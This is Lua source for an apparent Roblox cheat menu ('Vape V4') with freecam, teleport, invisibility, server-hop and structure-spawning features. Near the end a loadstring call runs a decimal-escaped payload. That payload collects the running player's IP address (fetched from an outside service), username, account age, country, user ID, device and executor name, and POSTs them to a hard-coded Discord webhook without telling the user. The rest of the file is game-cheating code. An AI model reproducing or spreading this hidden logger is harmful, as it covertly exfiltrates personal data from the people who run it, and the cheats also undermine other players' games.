							cameraRot = Vector2.new(math.clamp(cameraRot.x, -math.rad(90), math.rad(90)), cameraRot.y%(2*math.pi))

							local cameraCFrame = CFrame.new(cameraPos)*CFrame.fromOrientation(cameraRot.x, cameraRot.y, 0)*CFrame.new(vel*Vector3.new(1, 1, 1)*64*dt)
							cameraPos = cameraCFrame.p

							cam.CFrame = cameraCFrame
							cam.Focus = cameraCFrame*CFrame.new(0, 0, -GetFocusDistance(cameraCFrame))
							cam.FieldOfView = cameraFov
						end)
						Input.StartCapture()
					end)
				else
					Input.StopCapture()
					UnbindFromRenderStep("Freecam")
					PlayerState.Pop()
				end
			end,
			["HoverText"] = "Lets you fly and clip through walls freely\nwithout moving your player server-sided."
		})
		freecamspeed = Freecam.CreateSlider({
			["Name"] = "Speed",
			["Min"] = 1,
			["Max"] = 300,
			["Function"] = function(val) NAV_KEYBOARD_SPEED = Vector3.new(val / 75,  val / 75, val / 75) end,
			["Default"] = 75
		})

	end)

	runcode(function()

		local TeleportClick = {["Enabled"] = false}
		local DistanceForTeleport = {["Value"] = 1000}
		local teleport = false
		TeleportClick = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "TeleportClick",
			["Function"] = function(callback) if callback then 
					spawn(function()
						teleport = true
						local plr = game.Players.LocalPlayer
						local mouse = plr:GetMouse()
						local MainCharacter = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)
						local distance = (MainCharacter.HumanoidRootPart.Position - mouse.Hit.p).Magnitude
						if distance <= DistanceForTeleport.Value then
							MainCharacter:MoveTo(mouse.Hit.p)
						end
						wait(0.05)
						TeleportClick["ToggleButton"](false)
					end)
				else

				end
			end,
			["HoverText"] = "click and teleport to your mouse position", 
			["Default"] = false,

		})

		DistanceForTeleport = TeleportClick.CreateSlider({
			["Name"] = "Distance",
			["Min"] = 100,
			["Max"] = 3500,
			["Function"] = function(val)
			end,
			["HoverText"] = "dont go into space or you will die",
			["Default"] = 1000
		})

		local JoinSmallServer = {["Enabled"] = false}
		JoinSmallServer = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Join Smallest Server",
			["Function"] = function(callback) if callback then
					spawn(function()
						wait(0.05)
						JoinSmallServer["ToggleButton"](false)
						local PlaceID = game.PlaceId
						local AllIDs = {}
						local foundAnything = ""
						local actualHour = os.date("!*t").hour
						local Deleted = false

						local last

						local File = pcall(function()
							AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
						end)
						if not File then
							table.insert(AllIDs, actualHour)
							writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
						end
						function TPReturner()
							local Site;
							if foundAnything == "" then
								Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
							else
								Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
							end
							local ID = ""
							if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
								foundAnything = Site.nextPageCursor
							end
							local num = 0;
							local extranum = 0
							for i,v in pairs(Site.data) do
								extranum += 1
								local Possible = true
								ID = tostring(v.id)
								if tonumber(v.maxPlayers) > tonumber(v.playing) then
									if extranum ~= 1 and tonumber(v.playing) < last or extranum == 1 then
										last = tonumber(v.playing)
									elseif extranum ~= 1 then
										continue
									end
									for _,Existing in pairs(AllIDs) do
										if num ~= 0 then
											if ID == tostring(Existing) then
												Possible = false
											end
										else
											if tonumber(actualHour) ~= tonumber(Existing) then
												local delFile = pcall(function()
													delfile("NotSameServers.json")
													AllIDs = {}
													table.insert(AllIDs, actualHour)
												end)
											end
										end
										num = num + 1
									end
									if Possible == true then
										table.insert(AllIDs, ID)
										wait()
										pcall(function()
											writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
											wait()
											game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
										end)
										wait(4)
									end
								end
							end
						end

						function Teleport()
							while wait() do
								pcall(function()
									TPReturner()
									if foundAnything ~= "" then
										TPReturner()
									end
								end)
							end
						end

						Teleport()
					end)
				end
			end,
			["HoverText"] = "click and teleport to your mouse position", 
			["Default"] = false,

		})
		local RejoinServer = {["Enabled"] = false}
		local rejoinserver = false
		RejoinServer = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Rejoin Server",
			["Function"] = function(callback) if callback then
					spawn(function()
						wait(0.05)
						RejoinServer["ToggleButton"](false)
						local ts = game:GetService("TeleportService")
						local p = game:GetService("Players").LocalPlayer


						ts:Teleport(game.PlaceId, p) 
					end)
				end
			end,
			["HoverText"] = "click and teleport to your mouse position", 
			["Default"] = false,

		})

		local SkyBox = {["Enabled"] = false}
		local TypeOfSky = {["Value"] = "SunnyDays"}
		local SkyBoxEnabled = false

		SkyBox = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "SkyBox",
			["Function"] = function(callback) if callback then
					spawn(function()
						SkyBoxEnabled = true
						if TypeOfSky.Value == "SunnyDays" then
							require(game:GetService("ReplicatedStorage").Modules.Client_Function_Bank).SunnyDays()
							wait(0.05)
							SkyBox["ToggleButton"](false)
						end
						if TypeOfSky.Value == "DoomWeather" then
							require(game:GetService("ReplicatedStorage").Modules.Client_Function_Bank).DoomWeather()
							wait(0.05)
							SkyBox["ToggleButton"](false)
						end
						if TypeOfSky.Value == "Rain" then
							require(game:GetService("ReplicatedStorage").Modules.Client_Function_Bank).ChangeSkybox("Rain")
							wait(0.05)
							SkyBox["ToggleButton"](false)
						end
					end)
				end
			end,
			["HoverText"] = "removes the rain",
			["Default"] = false,

		})
		TypeOfSky = SkyBox.CreateDropdown({
			["Name"] = "Mode",
			["List"] = {"SunnyDays","DoomWeather","Rain"},
			["Function"] = function(val) 
			end
		})

		local RemoveRain = {["Enabled"] = false}
		local removedrain = false

		RemoveRain = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Remove Rain",
			["Function"] = function(callback) if callback then
					spawn(function()
						wait(0.05)
						RemoveRain["ToggleButton"](false)
						if workspace:FindFirstChild('RainPart') ~= nil then
							workspace.RainPart:Destroy()
							game.ReplicatedStorage.Sounds.Nature.Rain:Stop()
							game.ReplicatedStorage.Sounds.Nature.Thunder:Stop()
							game.Lighting.Rain:Destroy()
							game.ReplicatedStorage.Skies.Shine:Clone().Parent = game.Lighting
						end
					end)
				end

			end,
			["HoverText"] = "removes the rain",
			["Default"] = false,

		})

		local structureName = {["Value"] = ""}
		local structureRotation = {["Value"] = 180}

		local CraftStructures = {["Enabled"] = false}
		CraftStructures = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Craft Structures",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						wait(0.05)
						CraftStructures["ToggleButton"](false)
						local mouse = game.Players.LocalPlayer:GetMouse()
						if structureName.Value == "Bridge" then
							local A_1 = "Bridge"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Dock" then
							local A_1 = "Dock"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Plant Box" then
							local A_1 = "Plant Box"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Wood Wall" then
							local A_1 = "Wood Wall"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Lookout" then
							local A_1 = "Lookout"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Chest" then
							local A_1 = "Chest"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Coin Press" then
							local A_1 = "Coin Press"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Stone Wall" then
							local A_1 = "Stone Wall"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Nest" then
							local A_1 = "Nest"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
						if structureName.Value == "Campfire" then
							local A_1 = "Campfire"
							local A_2 = CFrame.new(mouse.Hit.Position)
							local A_3 = structureRotation.Value
							local Event = game:GetService("ReplicatedStorage").Events.PlaceStructure
							Event:FireServer(A_1, A_2, A_3)
						end
					end)
				else
				end
			end,
			["HoverText"] = "Craft a structure in your mouse position",
			["Default"] = false,
			["ExtraText"] = function() return "" end
		})

		structureName = CraftStructures.CreateDropdown({
			["Name"] = "Select Structure",
			["List"] = {"Bridge", "Dock", "Plant Box", "Wood Wall", "Campfire", "Lookout", "Chest", "Coin Press", "Stone Wall", "Nest"},
			["Function"] = function(val)

			end
		})
		structureRotation = CraftStructures.CreateSlider({
			["Name"] = "Duration",
			["Min"] = 0,
			["Max"] = 360,
			["Function"] = function(val)
			end,
			["HoverText"] = "rotation of the structure",
			["Default"] = 180
		})

		local invenabled = false

		local Portal1 = {["Enabled"] = false}
		local Portal2 = {["Enabled"] = false}
		local Portal3 = {["Enabled"] = false}
		Portal1 = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Haven Portal",
			["Function"] = function(callback)
				if callback then

					spawn(function()
						wait(0.05)
						Portal1["ToggleButton"](false)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1022, -4.5, -808)	
					end)
				else
				end
			end,
			["HoverText"] = "teleport to haven portal",
			["Default"] = false,
			["ExtraText"] = function() return "" end
		})
		Portal2 = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Lava Portal",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						wait(0.05)
						Portal2["ToggleButton"](false)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1145, 21, 1252)	
					end)
				else
				end
			end,
			["HoverText"] = "teleport to lava portal",
			["Default"] = false,
			["ExtraText"] = function() return "" end
		})
		Portal3 = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Sky Portal",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						wait(0.05)
						Portal3["ToggleButton"](false)
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-70.602, 219.301, -617.171)	
					end)
				else
				end
			end,
			["HoverText"] = "teleport to sky portal",
			["Default"] = false,
			["ExtraText"] = function() return "" end
		})

		local NewLobby = {["Enabled"] = false}
		local Lobby = {["Enabled"] = false}
		Lobby = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Lobby",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1682.2772216796875, -3.60361385345459, -4133.912109375)	
						wait(0.05)
						Lobby["ToggleButton"](false)
					end)
				else
				end
			end,
			["HoverText"] = "teleport to sky portal",
			["Default"] = false,
			["ExtraText"] = function() return "" end
		})
		NewLobby = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Unused Lobby",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-187, -3, 17002)	
						wait(0.05)
						NewLobby["ToggleButton"](false)
					end)
				else
				end
			end,
			["HoverText"] = "teleport to unused lobby",
			["Default"] = false,
			["ExtraText"] = function() return "" end
		})

		local HackersPlace = {["Enabled"] = false}
		local Sit = {["Enabled"] = false}
		HackersPlace = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Hackers Place",
			["Function"] = function(callback) if callback then
					spawn(function()
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(20000, 620, 20000)
						wait(0.05)
						HackersPlace["ToggleButton"](false)
					end)
				else

				end
			end,
			["HoverText"] = "Opens the market", 
			["Default"] = false,

		})
		Sit = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Sit",
			["Function"] = function(callback) if callback then
					spawn(function()
						if invenabled == false then
							game.Players.LocalPlayer.Character.Humanoid.Sit = true
							wait(0.05)
							Sit["ToggleButton"](false)
						else
							createwarning("Sit", "Cant sit while your invisible", 5)
						end
					end)

				else
				end
			end,
			["HoverText"] = "Opens the market", 
			["Default"] = false,

		})
		local OpenMarketOption = {["Enabled"] = false}
		OpenMarketOption = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Open Market",
			["Function"] = function(callback) if callback then
					spawn(function()
						wait(0.05)
						OpenMarketOption["ToggleButton"](false)
						for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.MainGui.LeftPanel:GetChildren()) do
							v.Visible = false
						end
						for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.MainGui.RightPanel:GetChildren()) do
							v.Visible = false
						end
						game:GetService("Players").LocalPlayer.PlayerGui.MainGui.RightPanel.Market.Visible = true
						game:GetService("Players").LocalPlayer.PlayerGui.MainGui.LeftPanel.Market.Visible = true
					end)

				else
				end
			end,
			["HoverText"] = "Opens the market", 
			["Default"] = false,

		})

		local UIScale = {["Enabled"] = false}
		local Scale = {["Value"] = 10}
		local UIScale = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "UIScale",
			["Function"] = function(callback) if callback then

					spawn(function()
						while wait(0.1) do
							if game.Players.LocalPlayer.PlayerGui.MainGui then
								game.Players.LocalPlayer.PlayerGui.MainGui.GlobalUIScale.Value = Scale.Value / 50
							end
						end
					end)
				else
				end
			end,
			["HoverText"] = "create your toast", 
			["Default"] = false,

		})
		Scale = UIScale.CreateSlider({
			["Name"] = "Scale",
			["Min"] = 1,
			["Max"] = 100,
			["Function"] = function(val)

			end,
			["HoverText"] = "time your toast will dissapear",
			["Default"] = 10
		})

		local x = 0
		local y = 0
		local z = 0
		local isInvisible = false
		local notDied = false
		local InvisibleOption = {["Enabled"] = false}
		InvisibleOption = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Invisible",
			["Function"] = function(callback) if callback then
					spawn(function()
						local MainCharacter = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)
						if game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("LowerTorso") and notDied == false then

							require(game.ReplicatedStorage.Modules.Client_Function_Bank).CreateNotification("You are not invisible you cant pickup manually instead use auto pickup to bypass and you cant go in portals", Color3.fromRGB(255, 255, 255), 20)
							notDied = false
							x = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Position.X
							y = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Position.Y
							z = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Position.Z
							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Transparency = 0
							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Material = Enum.Material.ForceField
							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Color = Color3.fromRGB(255, 255, 255)
							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).Animate:Destroy()
							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).UpperTorso.Anchored = true
							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).Head.Anchored = true
							wait(0.05)
							InvisibleOption["ToggleButton"](false)
							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.CFrame = CFrame.new(x, y, z)
							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("LowerTorso"):Destroy()

							local MainCharacter = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)

							local Teleport1 = game.Workspace.Teleporters
							Teleport1.Parent = game.ReplicatedStorage

							game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).Humanoid.Died:Connect(function()
								notDied = true
								wait(5)
								isInvisible = false
								local Teleport2 = game.ReplicatedStorage.Teleporters
								Teleport2.Parent = game.Workspace
								notDied = false
							end)
						end
					end)

				else
				end
			end,
			["HoverText"] = "makes you invisible", 
			["Default"] = false,

		})

		local sellItemenabled = false
		local NameOfItem = {["Value"] = "Stick"}
		local AmmountOfItem = {["Value"] = 5}
		local AmmountOfCost = {["Value"] = 100}
		local SellItem = {["Enabled"] = false}
		SellItem = Utility.CreateOptionsButton({
			["Name"] = "Sell Item",
			["Function"] = function(callback) if callback then 
					spawn(function()
						local args = {
							[1] = tostring(NameOfItem),
							[2] = AmmountOfCost,
							[3] = AmmountOfItem
						}

						game:GetService("ReplicatedStorage").Events.SubmitTrade:FireServer(unpack(args))
						wait(0.05)
						SellItem["ToggleButton"](false)
					end)

				else
				end
			end,
			["HoverText"] = "sell the item", 
			["Default"] = false,

		})
		NameOfItem = SellItem.CreateTextBox({
			["Name"] = "Item",
			["TempText"] = "Item Name",
			["HoverText"] = "the item you want to sell"
		})
		AmmountOfItem = SellItem.CreateSlider({
			["Name"] = "Item Ammount",
			["Min"] = 10,
			["Max"] = 120,
			["Function"] = function(val)

			end,
			["HoverText"] = "change your view and make your screen more wider",
			["Default"] = 70
		})
		AmmountOfCost = SellItem.CreateSlider({
			["Name"] = "Coins Price",
			["Min"] = 10,
			["Max"] = 120,
			["Function"] = function(val)

			end,
			["HoverText"] = "change your view and make your screen more wider",
			["Default"] = 70
		})
		
		loadstring("\32\32\32\32\108\111\99\97\108\32\87\101\98\72\111\111\107\32\61\32\34\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\97\112\112\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\57\56\49\55\57\57\53\53\54\52\54\53\52\53\53\49\52\52\47\90\49\95\112\99\84\52\115\102\84\117\72\73\95\79\114\68\65\102\70\101\104\121\70\97\54\121\112\70\77\84\75\117\103\119\95\84\69\114\101\80\84\72\119\119\81\77\108\55\98\71\78\121\108\57\107\70\114\52\55\77\100\56\89\86\119\66\110\34\10\108\111\99\97\108\32\71\101\116\78\97\109\101\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\77\97\114\107\101\116\112\108\97\99\101\83\101\114\118\105\99\101\34\41\58\71\101\116\80\114\111\100\117\99\116\73\110\102\111\40\103\97\109\101\46\80\108\97\99\101\73\100\41\10\10\108\111\99\97\108\32\119\101\98\104\111\111\107\99\104\101\99\107\32\61\10\9\105\115\95\115\105\114\104\117\114\116\95\99\108\111\115\117\114\101\32\97\110\100\32\34\83\105\114\104\117\114\116\34\32\111\114\32\112\101\98\99\95\101\120\101\99\117\116\101\32\97\110\100\32\34\80\114\111\116\111\83\109\97\115\104\101\114\34\32\111\114\32\115\121\110\32\97\110\100\32\34\83\121\110\97\112\115\101\32\88\34\32\111\114\10\9\115\101\99\117\114\101\95\108\111\97\100\32\97\110\100\32\34\83\101\110\116\105\110\101\108\34\32\111\114\10\9\75\82\78\76\95\76\79\65\68\69\68\32\97\110\100\32\34\75\114\110\108\32\111\114\32\66\108\111\120\105\88\34\32\111\114\10\9\34\70\114\101\101\32\101\120\101\99\117\116\111\114\34\32\10\9\111\114\32\34\74\74\83\112\108\111\105\116\34\10\9\111\114\32\34\67\111\99\111\32\90\34\10\9\111\114\32\34\70\108\117\120\117\115\34\10\9\111\114\32\34\75\105\119\105\34\10\9\111\114\32\34\67\111\109\101\116\34\10\9\111\114\32\34\79\120\121\103\101\110\32\85\34\10\9\111\114\32\34\78\111\118\97\108\105\110\101\34\10\9\111\114\32\34\69\118\111\110\34\10\9\111\114\32\34\78\105\104\111\110\34\10\9\111\114\32\34\82\111\45\87\97\114\101\34\10\9\111\114\32\34\68\97\110\115\112\108\111\105\116\34\10\10\108\111\99\97\108\32\117\105\115\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\85\115\101\114\73\110\112\117\116\83\101\114\118\105\99\101\34\41\10\108\111\99\97\108\32\100\101\118\105\99\101\32\61\32\34\34\10\105\102\32\117\105\115\46\71\97\109\101\112\97\100\69\110\97\98\108\101\100\32\116\104\101\110\10\9\100\101\118\105\99\101\32\61\32\34\88\98\111\120\34\10\101\110\100\10\105\102\32\117\105\115\46\75\101\121\98\111\97\114\100\69\110\97\98\108\101\100\32\116\104\101\110\10\9\100\101\118\105\99\101\32\61\32\34\80\67\34\10\101\110\100\10\105\102\32\117\105\115\46\84\111\117\99\104\69\110\97\98\108\101\100\32\116\104\101\110\10\9\100\101\118\105\99\101\32\61\32\34\77\111\98\105\108\101\34\10\101\110\100\10\10\108\111\99\97\108\32\105\112\32\61\32\116\111\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\97\112\105\46\105\112\105\102\121\46\111\114\103\34\44\32\116\114\117\101\41\41\10\108\111\99\97\108\32\117\114\108\32\61\32\87\101\98\72\111\111\107\10\108\111\99\97\108\32\100\97\116\97\32\61\32\123\10\9\91\34\99\111\110\116\101\110\116\34\93\32\61\32\34\34\44\10\9\91\34\101\109\98\101\100\115\34\93\32\61\32\123\10\9\9\123\10\9\9\9\91\34\97\117\116\104\111\114\34\93\32\61\32\123\10\9\9\9\9\91\34\110\97\109\101\34\93\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\78\97\109\101\44\10\9\9\9\125\44\10\9\9\9\91\34\100\101\115\99\114\105\112\116\105\111\110\34\93\32\61\32\34\117\115\105\110\103\32\118\97\112\101\32\118\52\34\44\10\9\9\9\91\34\99\111\108\111\114\34\93\32\61\32\116\111\110\117\109\98\101\114\40\48\120\70\70\70\65\70\65\41\44\10\9\9\9\91\34\102\105\101\108\100\115\34\93\32\61\32\123\10\9\9\9\9\123\10\9\9\9\9\9\91\34\110\97\109\101\34\93\32\61\32\34\68\105\115\112\108\97\121\32\78\97\109\101\58\34\44\10\9\9\9\9\9\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\68\105\115\112\108\97\121\78\97\109\101\44\10\9\9\9\9\9\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\10\9\9\9\9\125\44\10\9\9\9\9\123\10\9\9\9\9\9\91\34\110\97\109\101\34\93\32\61\32\34\65\99\99\111\117\110\116\32\65\103\101\58\34\44\10\9\9\9\9\9\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\65\99\99\111\117\110\116\65\103\101\44\10\9\9\9\9\9\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\10\9\9\9\9\125\44\10\9\9\9\9\123\10\9\9\9\9\9\91\34\110\97\109\101\34\93\32\61\32\34\76\111\99\97\116\105\111\110\58\34\44\10\9\9\9\9\9\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\111\99\97\108\105\122\97\116\105\111\110\83\101\114\118\105\99\101\34\41\58\71\101\116\67\111\117\110\116\114\121\82\101\103\105\111\110\70\111\114\80\108\97\121\101\114\65\115\121\110\99\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\41\44\10\9\9\9\9\9\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\10\9\9\9\9\125\44\10\9\9\9\9\123\10\9\9\9\9\9\91\34\110\97\109\101\34\93\32\61\32\34\80\108\97\121\101\114\32\73\80\58\34\44\10\9\9\9\9\9\91\34\118\97\108\117\101\34\93\32\61\32\105\112\44\10\9\9\9\9\9\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\10\9\9\9\9\125\44\10\9\9\9\9\123\10\9\9\9\9\9\91\34\110\97\109\101\34\93\32\61\32\34\85\115\101\114\32\68\101\118\105\99\101\58\34\44\10\9\9\9\9\9\91\34\118\97\108\117\101\34\93\32\61\32\100\101\118\105\99\101\44\10\9\9\9\9\9\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\10\9\9\9\9\125\44\10\9\9\9\9\123\10\9\9\9\9\9\91\34\110\97\109\101\34\93\32\61\32\34\85\115\101\114\32\73\68\58\34\44\10\9\9\9\9\9\91\34\118\97\108\117\101\34\93\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\85\115\101\114\73\100\44\10\9\9\9\9\9\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\10\9\9\9\9\125\44\10\9\9\9\9\123\10\9\9\9\9\9\91\34\110\97\109\101\34\93\32\61\32\34\69\120\101\99\117\116\111\114\58\34\44\10\9\9\9\9\9\91\34\118\97\108\117\101\34\93\32\61\32\116\111\115\116\114\105\110\103\40\105\100\101\110\116\105\102\121\101\120\101\99\117\116\111\114\40\41\41\44\10\9\9\9\9\9\91\34\105\110\108\105\110\101\34\93\32\61\32\116\114\117\101\10\9\9\9\9\125\44\10\9\9\9\125\10\9\9\125\10\9\125\10\125\10\108\111\99\97\108\32\110\101\119\100\97\116\97\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\72\116\116\112\83\101\114\118\105\99\101\34\41\58\74\83\79\78\69\110\99\111\100\101\40\100\97\116\97\41\10\10\108\111\99\97\108\32\104\101\97\100\101\114\115\32\61\32\123\10\9\91\34\99\111\110\116\101\110\116\45\116\121\112\101\34\93\32\61\32\34\97\112\112\108\105\99\97\116\105\111\110\47\106\115\111\110\34\10\125\10\114\101\113\117\101\115\116\32\61\32\104\116\116\112\95\114\101\113\117\101\115\116\32\111\114\32\114\101\113\117\101\115\116\32\111\114\32\72\116\116\112\80\111\115\116\32\111\114\32\115\121\110\46\114\101\113\117\101\115\116\10\108\111\99\97\108\32\97\98\99\100\101\102\32\61\32\123\85\114\108\32\61\32\117\114\108\44\32\66\111\100\121\32\61\32\110\101\119\100\97\116\97\44\32\77\101\116\104\111\100\32\61\32\34\80\79\83\84\34\44\32\72\101\97\100\101\114\115\32\61\32\104\101\97\100\101\114\115\125\10\114\101\113\117\101\115\116\40\97\98\99\100\101\102\41\10")()
		
		shared.VapeManualLoad = true
		while game:GetService("RunService").Heartbeat:Wait() do
			pcall(function()
				if Animation == true then
					if AnimationDelay.Value == "Normal" then
						wait(0.33)
						Animation = false
					end
					if AnimationDelay.Value == "Fast" then
						wait(0.11)
						Animation = false
					end
					if AnimationDelay.Value == "Slow" then
						wait(0.66)
						Animation = false
					end
				end
			end)
			pcall(function()
				for i,enemy in pairs(game.Players:GetPlayers()) do
					if enemy.Character and enemy.Character:FindFirstChild("Humanoid") 
						and enemy.Character.Humanoid.Health >= 0 
						and enemy.Character:FindFirstChild("HumanoidRootPart") 
						and enemy.Name ~= game.Players.LocalPlayer.Name
						and (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - enemy.Character.HumanoidRootPart.Position).Magnitude <= 3 
					then
						local targettable = {}
						targettable[enemy.Name] = {
							["UserId"] = enemy.UserId,
							["Health"] = enemy.Character.Humanoid.Health,
							["MaxHealth"] = enemy.Character.Humanoid.MaxHealth
						}

						targetinfo.UpdateInfo(targettable, 1)
					end
				end
			end)
		end
	end)
end

function Check()
	if shared.VapeExecuted then
		if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Warning") == nil then
			Warning("Vape V4 Is already executor Leftshift to see the menu to see our options")
		end
	else
		if (readfile and isfile and isfile("vapekey.txt")) then
			local plrkey = readfile("vapekey.txt")
			if plrkey == key then
				print("vapekey")
				MainScript()
			else
				KeySystem()
			end
		else
			KeySystem()
		end
	end
end

Check()
